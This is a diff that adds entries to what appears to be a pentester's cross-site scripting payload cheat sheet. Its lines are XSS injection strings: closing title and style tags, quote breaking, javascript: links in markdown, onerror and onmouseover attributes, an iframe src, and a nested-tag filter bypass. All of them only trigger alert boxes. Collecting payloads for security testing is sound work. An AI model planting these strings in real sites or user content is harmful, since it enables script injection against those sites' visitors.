@@ -22,7 +22,14 @@ text123</title><script>alert(1)</script> # Title tag must be closed </title>
 #fff);}</style><script>alert(1)</script><style>body{background-color:#   # Style sink close
 text123%27;alert(1)// # Check the special characters like single or double quotes
 <script></script><script>alert(1)</script>
-
+# Markdown https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md
+[Ashok](javascript:alert``)
+![ashok](https://ashok5141.github.io/img/Ashok.jpg1"onerror=alert(1)//;)
+![ashok](https://ashok5141.github.io/img/Ashok.jpg1"onmouseover=alert(1)//;)
+<u/onmouseover=alert();//>ashok # When filtering
+<iframe/src=javascript:alert();//>
+<a/href=javascript:alert(2)>Click_Me
+<scr<script>ipt>alert(1)</scr</script>ipt>
 
 
 ```
